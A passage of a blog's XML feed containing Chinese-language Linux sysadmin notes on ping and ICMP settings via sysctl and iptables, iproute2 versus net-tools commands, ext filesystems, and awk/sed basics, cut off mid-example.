&#x5230;&#x4E86;&#x600E;&#x6837;&#x5F97;&#x5230;MAC&#x5730;&#x5740;&#x65F6;&#xFF0C;IP&#x534F;&#x8BAE;&#x901A;&#x8FC7;&#x8BA1;&#x7B97;&#x53D1;&#x73B0;C&#x673A;&#x4E0E;&#x81EA;&#x5DF1;&#x4E0D;&#x5728;&#x540C;&#x4E00;&#x7F51;&#x6BB5;&#x5185;&#xFF0C;&#x5C31;&#x76F4;&#x63A5;&#x4EA4;&#x7ED9;&#x8DEF;&#x7531;&#x5668;&#x5904;&#x7406;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5C06;&#x8DEF;&#x7531;&#x7684;MAC&#x53D6;&#x8FC7;&#x6765;&#xFF0C;&#x81F3;&#x4E8E;&#x600E;&#x6837;&#x5F97;&#x5230;&#x8DEF;&#x7531;&#x7684;MAC&#xFF0C;&#x8DDF;&#x4E0A;&#x9762;&#x4E00;&#x6837;&#xFF0C;<strong>&#x5148;&#x5728;ARP&#x7F13;&#x5B58;&#x8868;&#x627E;&#xFF0C;&#x627E;&#x4E0D;&#x5230;&#x5C31;&#x5E7F;&#x64AD;&#x5305;&#x3002;&#x8DEF;&#x7531;&#x5F97;&#x5230;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x5E27;&#x540E;&#xFF0C;&#x518D;&#x8DDF;&#x4E3B;&#x673A;C&#x8FDB;&#x884C;&#x8054;&#x7CFB;&#xFF0C;&#x5982;&#x679C;&#x627E;&#x4E0D;&#x5230;&#xFF0C;&#x5C31;&#x5411;&#x4E3B;&#x673A;A&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x8D85;&#x65F6;&#x7684;&#x4FE1;&#x606F;</strong>&#x3002;</p><p>Linux&#x9ED8;&#x8BA4;&#x662F;&#x5141;&#x8BB8;Ping&#x54CD;&#x5E94;&#x7684;&#xFF0C;&#x7CFB;&#x7EDF;&#x662F;&#x5426;&#x5141;&#x8BB8;Ping&#x7531;2&#x4E2A;&#x56E0;&#x7D20;&#x51B3;&#x5B9A;&#x7684;&#xFF1A;A&#x3001;&#x5185;&#x6838;&#x53C2;&#x6570;&#xFF0C;B&#x3001;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x9700;&#x8981;2&#x4E2A;&#x56E0;&#x7D20;&#x540C;&#x65F6;&#x5141;&#x8BB8;&#x624D;&#x80FD;&#x5141;&#x8BB8;Ping&#xFF0C;2&#x4E2A;&#x56E0;&#x7D20;&#x6709;&#x4EFB;&#x610F;&#x4E00;&#x4E2A;&#x7981;Ping&#x5C31;&#x65E0;&#x6CD5;Ping&#x3002;</p><p>&#x5177;&#x4F53;&#x7684;&#x914D;&#x7F6E;&#x65B9;&#x6CD5;</p><p>&#x5185;&#x6838;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;</p><p>1&#x3001;&#x5141;&#x8BB8;PING&#x8BBE;&#x7F6E;</p><p>A. &#x4E34;&#x65F6;&#x5141;&#x8BB8;PING&#x64CD;&#x4F5C;&#x7684;&#x547D;&#x4EE4;&#x4E3A;&#xFF1A;<code>echo 0 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all</code></p><p>B. &#x6C38;&#x4E45;&#x5141;&#x8BB8;PING&#x914D;&#x7F6E;&#x65B9;&#x6CD5;&#x3002;<br>  &#x5728; /etc/sysctl.conf &#x4E2D;&#x589E;&#x52A0;&#x4E00;&#x884C;<br>  net.ipv4.icmp_echo_ignore_all=0<br>  &#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x6709;net.ipv4.icmp_echo_ignore_all&#x8FD9;&#x4E00;&#x884C;&#x4E86;&#xFF0C;&#x76F4;&#x63A5;&#x4FEE;&#x6539;=&#x53F7;&#x540E;&#x9762;&#x7684;&#x503C;&#x5373;&#x53EF;&#x7684;&#xFF08;0&#x8868;&#x793A;&#x5141;&#x8BB8;&#xFF0C;1&#x8868;&#x793A;&#x7981;&#x6B62;&#xFF09;&#x3002;<br>   &#x4FEE;&#x6539;&#x5B8C;&#x6210;&#x540E;&#x6267;&#x884C;sysctl -p&#x4F7F;&#x65B0;&#x914D;&#x7F6E;&#x751F;&#x6548;&#x3002;</p><p>2&#x3001;&#x7981;&#x6B62;Ping&#x8BBE;&#x7F6E;     </p><p>A.&#x4E34;&#x65F6;&#x7981;&#x6B62;PING&#x7684;&#x547D;&#x4EE4;&#x4E3A;&#xFF1A;echo 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all     </p><p>B.&#x6C38;&#x4E45;&#x7981;&#x6B62;PING&#x914D;&#x7F6E;&#x65B9;&#x6CD5;&#x3002;<br>   /etc/sysctl.conf &#x4E2D;&#x589E;&#x52A0;&#x4E00;&#x884C;<br>   net.ipv4.icmp_echo_ignore_all=1<br>   &#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x6709;net.ipv4.icmp_echo_ignore_all&#x8FD9;&#x4E00;&#x884C;&#x4E86;&#xFF0C;&#x76F4;&#x63A5;&#x4FEE;&#x6539;=&#x53F7;&#x540E;&#x9762;&#x7684;&#x503C;&#x5373;&#x53EF;&#x7684;&#x3002;&#xFF08;0&#x8868;&#x793A;&#x5141;&#x8BB8;&#xFF0C;1&#x8868;&#x793A;&#x7981;&#x6B62;&#xFF09;<br>   &#x4FEE;&#x6539;&#x5B8C;&#x6210;&#x540E;&#x6267;&#x884C;sysctl -p&#x4F7F;&#x65B0;&#x914D;&#x7F6E;&#x751F;&#x6548;&#x3002;</p><p>&#x9632;&#x706B;&#x5899;&#x8BBE;&#x7F6E;</p><p>&#x6CE8;&#xFF1A;&#x6B64;&#x5904;&#x7684;&#x65B9;&#x6CD5;&#x7684;&#x524D;&#x63D0;&#x662F;&#x5185;&#x6838;&#x914D;&#x7F6E;&#x662F;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6CA1;&#x6709;&#x7981;&#x6B62;ping<br>&#x8FD9;&#x91CC;&#x4EE5;iptables&#x9632;&#x706B;&#x5899;&#x4E3A;&#x4F8B;&#xFF0C;&#x5176;&#x4ED6;&#x9632;&#x706B;&#x5899;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#x53EF;&#x53C2;&#x8003;&#x9632;&#x706B;&#x5899;&#x7684;&#x5B98;&#x65B9;&#x6587;&#x6863;&#x3002;</p><p>1&#x3001;&#x5141;&#x8BB8;PING&#x8BBE;&#x7F6E;      </p><pre><code>iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPTiptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT</code></pre><p>2&#x3001;&#x7981;&#x6B62;PING&#x8BBE;&#x7F6E;</p><pre><code>iptables -A INPUT -p icmp --icmp-type echo-request -j DROPiptables -A OUTPUT -p icmp --icmp-type echo-reply -j DROPiptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP--icmp-type 8 echo request&#x2014;&#x2014;&#x56DE;&#x663E;&#x8BF7;&#x6C42;&#xFF08;ping&#x8BF7;&#x6C42;&#xFF09;0/0 &#x6240;&#x6709; IPiptables -A INPUT -p icmp --icmp-type 8 -j DROPiptables -A INPUT -p icmp --icmp-type 0 -j DROP0  Echo Reply&#x2014;&#x2014;&#x56DE;&#x663E;&#x5E94;&#x7B54;&#xFF08;Ping&#x5E94;&#x7B54;&#xFF09;8  Echo request&#x2014;&#x2014;&#x56DE;&#x663E;&#x8BF7;&#x6C42;&#xFF08;Ping&#x8BF7;&#x6C42;&#xFF09;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ping-&amp;#x539F;&amp;#x7406;&quot;&gt;&lt;a href=&quot;#ping-&amp;#x539F;&amp;#x7406;&quot; class=&quot;headerlink&quot; title=&quot;ping &amp;#x539F;&amp;#x7406;&quot;&gt;&lt;/a&gt;ping &amp;#x539F;&amp;#x7406;&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>iproute2工具包</title>
    <link href="https://marnm.github.io//posts/1ebd4a76/"/>
    <id>https://marnm.github.io//posts/1ebd4a76/</id>
    <published>2022-06-07T04:39:38.000Z</published>
    <updated>2022-06-07T05:21:04.448Z</updated>
    
    <content type="html"><![CDATA[<h1 id="iproute2-&#x5DE5;&#x5177;"><a href="#iproute2-&#x5DE5;&#x5177;" class="headerlink" title="iproute2 &#x5DE5;&#x5177;"></a>iproute2 &#x5DE5;&#x5177;</h1><table><thead><tr><th>net-tools</th><th>iproute2</th></tr></thead><tbody><tr><td>arp -na</td><td>ip neigh</td></tr><tr><td>ifconfig</td><td>ip link</td></tr><tr><td>ifconfig -a</td><td>ip addr show</td></tr><tr><td>ifconfig &#x2013;help</td><td>ip help</td></tr><tr><td>ifconfig -eth0 up</td><td>ip link set eth0 up</td></tr><tr><td>ipmaddr</td><td>ip maddr</td></tr><tr><td>iptunnel</td><td>ip tunnel</td></tr><tr><td>netstat</td><td>ss</td></tr><tr><td>netstat -i</td><td>ip -s link</td></tr><tr><td>netstat -g</td><td>ip maddr</td></tr><tr><td>netstat -l</td><td>ss -l</td></tr><tr><td>netstat -r</td><td>ip route</td></tr><tr><td>route add</td><td>ip route add</td></tr><tr><td>route del</td><td>ip route del</td></tr><tr><td>route -n</td><td>ip route show</td></tr><tr><td>vconfig</td><td>ip link</td></tr></tbody></table><table><thead><tr><th>iproute2</th><th>net-tools</th><th>Notes</th></tr></thead><tbody><tr><td>ip link show</td><td>ifconfig -a</td><td>&#x663E;&#x793A;&#x6240;&#x6709;&#x7F51;&#x5361;</td></tr><tr><td>ip link set down/up eth0</td><td>ifconfig eth0 up/down</td><td>&#x542F;&#x52A8;/&#x5173;&#x95ED;&#x7F51;&#x5361;</td></tr><tr><td>ip addr add 192.168.0.10/24 dev eth0</td><td>ifconfig eth0 192.168.0.10/24</td><td>&#x5728;eth0&#x4E0A;&#x6DFB;&#x52A0;IP&#x5730;&#x5740;</td></tr><tr><td>ip addr del 192.168.0.10/24 dev eth0</td><td>ifconfig eth0 0</td><td>&#x5220;&#x9664;eth0&#x7684;IP&#x5730;&#x5740;</td></tr><tr><td>ip addr show dev eth0</td><td>ifconfig eth0</td><td>&#x67E5;&#x770B;eth0&#x7684;&#x7F51;&#x7EDC;&#x914D;&#x7F6E;&#x4FE1;&#x606F;</td></tr><tr><td>ip -6 addr add fe80::f0b7:57ff:fe2f:5f0d/64 dev eth1</td><td>ifconfig eth1 inet6 add fe80::f0b7:57ff:fe2f:5f0d/64</td><td>&#x5728;eth1&#x4E0A;&#x6DFB;&#x52A0;IPv6&#x5730;&#x5740;</td></tr><tr><td>ip -6 addr show dev eth0</td><td>ifconfig eth0</td><td>&#x67E5;&#x770B;IPv6&#x5730;&#x5740;</td></tr><tr><td>ip link set dev eth0 address 02:42:20:d2:28:36</td><td>ifconfig eth0 hw ether 02:42:20:d2:28:36</td><td>&#x914D;&#x7F6E;MAC&#x5730;&#x5740;</td></tr><tr><td>ip route show</td><td>route -n</td><td>&#x67E5;&#x770B;&#x8DEF;&#x7531;&#x8868;&#x4FE1;&#x606F;</td></tr><tr><td>ip route add default via 192.168.0.1 dev eth0</td><td>route add default gw 192.168.0.1 eth0</td><td>&#x6DFB;&#x52A0;&#x9ED8;&#x8BA4;&#x8DEF;&#x7531;</td></tr><tr><td>ip roue replace default via 192.168.0.1 dev ens33</td><td>route del default gw 192.168.0.1 ens33</td><td>&#x5220;&#x9664;&#x9ED8;&#x8BA4;&#x8DEF;&#x7531;</td></tr><tr><td>ip route add 10.24.32.0/24 via 192.168.0.1 dev ens33</td><td>route add -net 10.24.32.0/24 gw 192.168.0.1 dev ens33</td><td>&#x6DFB;&#x52A0;&#x9759;&#x6001;&#x8DEF;&#x7531;</td></tr><tr><td>ip route del 192.168.10.0/24</td><td>route del -net 192.168.10.0/24</td><td>&#x5220;&#x9664;&#x9759;&#x6001;&#x8DEF;&#x7531;</td></tr><tr><td>ss</td><td>netstat</td><td>&#x67E5;&#x770B;tcp/udp&#x7684;scoket&#x76D1;&#x542C;&#x4FE1;&#x606F;</td></tr><tr><td>arp -an</td><td>ip neigh</td><td>&#x67E5;&#x770B;ARP&#x8868;</td></tr><tr><td>bridge</td><td>brctl</td><td>&#x7BA1;&#x7406;bridge&#x5730;&#x5740;&#x548C;device</td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;iproute2-&amp;#x5DE5;&amp;#x5177;&quot;&gt;&lt;a href=&quot;#iproute2-&amp;#x5DE5;&amp;#x5177;&quot; class=&quot;headerlink&quot; title=&quot;iproute2 &amp;#x5DE5;&amp;#x5177;&quot;&gt;&lt;/a&gt;iproute2 &amp;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>LVM磁盘管理</title>
    <link href="https://marnm.github.io//posts/38cc96c8/"/>
    <id>https://marnm.github.io//posts/38cc96c8/</id>
    <published>2022-06-07T04:39:21.000Z</published>
    <updated>2022-06-07T05:21:22.680Z</updated>
    
    <content type="html"><![CDATA[<h3 id="EXT&#x6269;&#x5C55;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF08;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF09;"><a href="#EXT&#x6269;&#x5C55;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF08;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF09;" class="headerlink" title="EXT&#x6269;&#x5C55;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF08;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF09;"></a>EXT&#x6269;&#x5C55;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF08;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF09;</h3><p>ext2&#x3001;ext3&#xFF1A;linux&#x73AF;&#x5883;&#x4E0A;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002;ext2/ext3&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x8282;&#x70B9;&#x6765;&#x8BB0;&#x5F55;&#x6587;&#x4EF6;&#x4FE1;&#x606F;&#xFF0C;&#x4F5C;&#x7528;&#x5C31;&#x50CF;Windows&#x7684;&#x6587;&#x4EF6;&#x5206;&#x914D;&#x8868;&#x3002;&#x7D22;&#x5F15;&#x8282;&#x70B9;&#x662F;&#x4E00;&#x4E2A;&#x7ED3;&#x6784;&#xFF0C;&#x5B83;&#x5305;&#x542B;&#x4E86;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x957F;&#x5EA6;&#x3001;&#x521B;&#x5EFA;&#x53CA;&#x4FEE;&#x6539;&#x65F6;&#x95F4;&#x3001;&#x6743;&#x9650;&#x3001;&#x6240;&#x5C5E;&#x5173;&#x7CFB;&#x3001;&#x78C1;&#x76D8;&#x4E2D;&#x7684;&#x4F4D;&#x7F6E;&#x7B49;&#x4FE1;&#x606F;</p><p>ext2&#x3001;ext3&#x7684;&#x533A;&#x522B;&#x5982;&#x4E0B;&#xFF1A;<br>ext2&#x548C;ext3&#x7684;&#x683C;&#x5F0F;&#x5B8C;&#x5168;&#x76F8;&#x540C;&#xFF0C;&#x77E5;&#x8BC6;&#x5728;ext3&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x6700;&#x540E;&#x9762;&#x6709;&#x4E00;&#x90E8;&#x5206;&#x7A7A;&#x95F4;&#x7528;&#x6765;&#x5B58;&#x653E;journal&#xFF08;&#x65E5;&#x5FD7;&#xFF09;&#x7684;&#x8BB0;&#x5F55;<br>ext2&#x4E2D;&#xFF0C;&#x5199;&#x8D44;&#x6599;&#x5230;&#x786C;&#x76D8;&#x91CC;&#x9762;&#x65F6;&#xFF0C;&#x5148;&#x5C06;&#x8D44;&#x6599;&#x5199;&#x5165;&#x7F13;&#x5B58;&#x4E2D;&#xFF0C;&#x5F53;&#x7F13;&#x5B58;&#x5199;&#x6EE1;&#x662F;&#x624D;&#x56DE;&#x5199;&#x5165;&#x786C;&#x76D8;&#x91CC;&#x9762;<br>&#x5728;ext3&#x4E2D;&#xFF0C;&#x5199;&#x8D44;&#x6599;&#x5230;&#x786C;&#x76D8;&#x91CC;&#x9762;&#x65F6;&#xFF0C;&#x5148;&#x5C06;&#x8D44;&#x6599;&#x5199;&#x5165;&#x7F13;&#x5B58;&#x4E2D;&#xFF0C;&#x5F53;&#x7F13;&#x5B58;&#x5199;&#x6EE1;&#x65F6;&#x7CFB;&#x7EDF;&#x5148;&#x901A;&#x77E5;journal&#xFF0C;&#x518D;&#x5C06;&#x8D44;&#x6599;&#x5199;&#x5165;&#x786C;&#x76D8;&#xFF0C;&#x5B8C;&#x6210;&#x540E;&#x518D;&#x901A;&#x77E5;journal&#xFF0C;&#x8D44;&#x6599;&#x5DF2;&#x5B8C;&#x6210;&#x5199;&#x5165;&#x5DE5;&#x4F5C;</p><hr><p>&#x662F;&#x5426;&#x6709;journal&#x7684;&#x5DEE;&#x522B;<br>&#x5728;ext2&#x4E2D;&#xFF0C;&#x7CFB;&#x7EDF;&#x5F00;&#x673A;&#x65F6;&#x4F1A;&#x68C0;&#x67E5;&#x6709;&#x6548;&#x4F4D;&#xFF08;valid bit&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x503C;&#x4E3A;1&#xFF0C;&#x8868;&#x793A;&#x7CFB;&#x7EDF;&#x4E0A;&#x6B21;&#x6709;&#x6B63;&#x5E38;&#x5173;&#x673A;&#xFF1B;&#x5982;&#x679C;&#x4E3A;0&#xFF0C;&#x8868;&#x793A;&#x4E0A;&#x6B21;&#x5173;&#x673A;&#x672A;&#x6B63;&#x5E38;&#x5173;&#x673A;&#xFF0C;&#x90A3;&#x7CFB;&#x7EDF;&#x5C31;&#x4F1A;&#x4ECE;&#x5934;&#x68C0;&#x67E5;&#x786C;&#x76D8;&#x4E2D;&#x7684;&#x8D44;&#x6599;&#xFF0C;&#x8FD9;&#x6837;&#x65F6;&#x95F4;&#x4F1A;&#x5F88;&#x957F;<br>&#x5728;ext3&#x4E2D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;journal&#x673A;&#x5236;&#x91CC;&#xFF0C;&#x7CFB;&#x7EDF;&#x5F00;&#x673A;&#x65F6;&#x68C0;&#x67E5;journal&#x7684;&#x8D44;&#x6599;&#xFF0C;&#x6765;&#x67E5;&#x770B;&#x662F;&#x5426;&#x6709;&#x9519;&#x8BEF;&#x4EA7;&#x751F;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x5FEB;&#x4E86;&#x5F88;&#x591A;<br>tune2fs -j&#x5C06;ex2&#x8F6C;&#x6362;&#x6210;ext3</p><table><thead><tr><th>&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;</th><th>&#x6700;&#x5927;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#x957F;&#x5EA6;</th><th>&#x6700;&#x5927;&#x8DEF;&#x5F84;&#x540D;&#x957F;&#x5EA6;</th><th>&#x6700;&#x5927;&#x6587;&#x4EF6;&#x5927;&#x5C0F;</th><th>&#x6700;&#x5927;&#x5377;&#x5927;&#x5C0F;</th></tr></thead><tbody><tr><td>ext2</td><td>255bytes</td><td>&#x6CA1;&#x6709;&#x5B9A;&#x4E49;&#x9650;&#x5236;</td><td>2TB</td><td>32TB</td></tr><tr><td>ext3</td><td>255bytes</td><td>&#x6CA1;&#x6709;&#x5B9A;&#x4E49;&#x9650;&#x5236;</td><td>2TB</td><td>32TB</td></tr><tr><td>ext4</td><td>255bytes</td><td>&#x6CA1;&#x6709;&#x5B9A;&#x4E49;&#x9650;&#x5236;</td><td>16TB</td><td>1 EB</td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;EXT&amp;#x6269;&amp;#x5C55;&amp;#x6587;&amp;#x4EF6;&amp;#x7CFB;&amp;#x7EDF;&amp;#xFF08;&amp;#x65E5;&amp;#x5FD7;&amp;#x6587;&amp;#x4EF6;&amp;#x7CFB;&amp;#x7EDF;&amp;#xFF09;&quot;&gt;&lt;a href=&quot;#EXT&amp;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux文本四剑客</title>
    <link href="https://marnm.github.io//posts/b7f1c6/"/>
    <id>https://marnm.github.io//posts/b7f1c6/</id>
    <published>2022-06-07T04:38:58.000Z</published>
    <updated>2022-06-07T05:21:59.973Z</updated>
    
    <content type="html"><![CDATA[<h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">line1 f2 f3</span><br><span class="line">line2 f4 f5</span><br><span class="line">line3 f6 f7</span><br><span class="line">echo -e &quot;line1 f2 f3\nline2 f4 f5\nline3 f6 f7&quot; | awk &apos;{print &quot;Line No:&quot;NR&quot;, No of fields:&quot;NF, &quot;$0=&quot;$0, &quot;$1=&quot;$1, &quot;$2=&quot;$2, &quot;$3=&quot;$3}&apos; </span><br><span class="line">Line No:1, No of fields:3 $0=line1 f2 f3 $1=line1 $2=f2 $3=f3</span><br><span class="line">Line No:2, No of fields:3 $0=line2 f4 f5 $1=line2 $2=f4 $3=f5</span><br><span class="line">Line No:3, No of fields:3 $0=line3 f6 f7 $1=line3 $2=f6 $3=f7</span><br></pre></td></tr></tbody></table></figure><a id="more"></a><h3 id="&#x589E;&#x5220;&#x6539;&#x67E5;"><a href="#&#x589E;&#x5220;&#x6539;&#x67E5;" class="headerlink" title="&#x589E;&#x5220;&#x6539;&#x67E5;"></a>&#x589E;&#x5220;&#x6539;&#x67E5;</h3><h4 id="&#x6DFB;&#x52A0;&#x64CD;&#x4F5C;"><a href="#&#x6DFB;&#x52A0;&#x64CD;&#x4F5C;" class="headerlink" title="&#x6DFB;&#x52A0;&#x64CD;&#x4F5C;"></a>&#x6DFB;&#x52A0;&#x64CD;&#x4F5C;</h4><h4 id="&#x5220;&#x9664;&#x64CD;&#x4F5C;"><a href="#&#x5220;&#x9664;&#x64CD;&#x4F5C;" class="headerlink" title="&#x5220;&#x9664;&#x64CD;&#x4F5C;"></a>&#x5220;&#x9664;&#x64CD;&#x4F5C;</h4><h4 id="&#x4FEE;&#x6539;&#x64CD;&#x4F5C;"><a href="#&#x4FEE;&#x6539;&#x64CD;&#x4F5C;" class="headerlink" title="&#x4FEE;&#x6539;&#x64CD;&#x4F5C;"></a>&#x4FEE;&#x6539;&#x64CD;&#x4F5C;</h4><h4 id="&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;"><a href="#&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;" class="headerlink" title="&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;"></a>&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;</h4><h3 id="&#x66FF;&#x6362;"><a href="#&#x66FF;&#x6362;" class="headerlink" title="&#x66FF;&#x6362;"></a>&#x66FF;&#x6362;</h3><h4 id="&#x66FF;&#x6362;&#x5B57;&#x7B26;"><a href="#&#x66FF;&#x6362;&#x5B57;&#x7B26;" class="headerlink" title="&#x66FF;&#x6362;&#x5B57;&#x7B26;"></a>&#x66FF;&#x6362;&#x5B57;&#x7B26;</h4><h4 id="&#x66FF;&#x6362;&#x6570;&#x5B57;"><a href="#&#x66FF;&#x6362;&#x6570;&#x5B57;" class="headerlink" title="&#x66FF;&#x6362;&#x6570;&#x5B57;"></a><strong>&#x66FF;&#x6362;&#x6570;&#x5B57;</strong></h4><h4 id="&#x66FF;&#x6362;&#x82F1;&#x6587;"><a href="#&#x66FF;&#x6362;&#x82F1;&#x6587;" class="headerlink" title="&#x66FF;&#x6362;&#x82F1;&#x6587;"></a><strong>&#x66FF;&#x6362;&#x82F1;&#x6587;</strong></h4><h4 id="&#x66FF;&#x6362;&#x7A7A;&#x884C;"><a href="#&#x66FF;&#x6362;&#x7A7A;&#x884C;" class="headerlink" title="&#x66FF;&#x6362;&#x7A7A;&#x884C;"></a><strong>&#x66FF;&#x6362;&#x7A7A;&#x884C;</strong></h4><h3 id="&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;"><a href="#&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;" class="headerlink" title="&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;"></a>&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;</h3><h4 id="&#x6807;&#x51C6;"><a href="#&#x6807;&#x51C6;" class="headerlink" title="&#x6807;&#x51C6;"></a><strong>&#x6807;&#x51C6;</strong></h4><h4 id="&#x6269;&#x5C55;"><a href="#&#x6269;&#x5C55;" class="headerlink" title="&#x6269;&#x5C55;"></a><strong>&#x6269;&#x5C55;</strong></h4><h3 id="&#x6761;&#x4EF6;"><a href="#&#x6761;&#x4EF6;" class="headerlink" title="&#x6761;&#x4EF6;"></a>&#x6761;&#x4EF6;</h3><h3 id="&#x5217;&#x64CD;&#x4F5C;"><a href="#&#x5217;&#x64CD;&#x4F5C;" class="headerlink" title="&#x5217;&#x64CD;&#x4F5C;"></a>&#x5217;&#x64CD;&#x4F5C;</h3><h3 id="&#x884C;&#x64CD;&#x4F5C;"><a href="#&#x884C;&#x64CD;&#x4F5C;" class="headerlink" title="&#x884C;&#x64CD;&#x4F5C;"></a>&#x884C;&#x64CD;&#x4F5C;</h3><p>&#x6253;&#x5370;&#x7B2C;&#x4E00;&#x884C;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;NR==1{print}&apos; /tmp/tmp.txt</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h2><h3 id="&#x884C;&#x64CD;&#x4F5C;-1"><a href="#&#x884C;&#x64CD;&#x4F5C;-1" class="headerlink" title="&#x884C;&#x64CD;&#x4F5C;"></a>&#x884C;&#x64CD;&#x4F5C;</h3><p><strong>&#x6DFB;&#x52A0;&#x5185;&#x5BB9;&#x5230;&#x9996;&#x884C;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> &#x57FA;&#x672C;&#x8BED;&#x6CD5;&#xFF0C;&#xFF08;&#x7A7A;&#x683C;&#x53EF;&#x4EE5;&#x7701;&#x7565;&#xFF09;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> i&#x5728;&#x5F53;&#x524D;&#x884C;&#x63D2;&#x5165;&#x5185;&#x5BB9;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> a&#x5728;&#x5F53;&#x524D;&#x884C;&#x8FFD;&#x52A0;&#x5185;&#x5BB9;</span></span><br><span class="line">sed &apos;&#x4F5C;&#x7528;&#x8303;&#x56F4;&#x884C; &#x63D2;&#x5165;&#x884C;&#x524D;/&#x540E; &#x63D2;&#x5165;&#x5185;&#x5BB9;&apos; &#x6587;&#x4EF6;&#x540D;</span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x5728;file.txt&#x6587;&#x4EF6;&#x7B2C;1&#x884C;&#x524D;&#x9762;&#x63D2;&#x5165;hello</span></span><br><span class="line">sed -i &apos;1 i hello&apos; file.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x5728;file.txt&#x6587;&#x4EF6;&#x7B2C;1&#x884C;&#x540E;&#x9762;&#x63D2;&#x5165;world</span></span><br><span class="line">sed -i &apos;1 a world&apos; file.txt</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x6DFB;&#x52A0;&#x5185;&#x5BB9;&#x5230;&#x6307;&#x5B9A;&#x884C;</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> &#x5728;&#x7B2C;3&#x884C;&#x524D;&#x9762;&#x63D2;&#x5165;&#x5185;&#x5BB9;</span></span><br><span class="line">sed -i &apos;3i hello &apos; 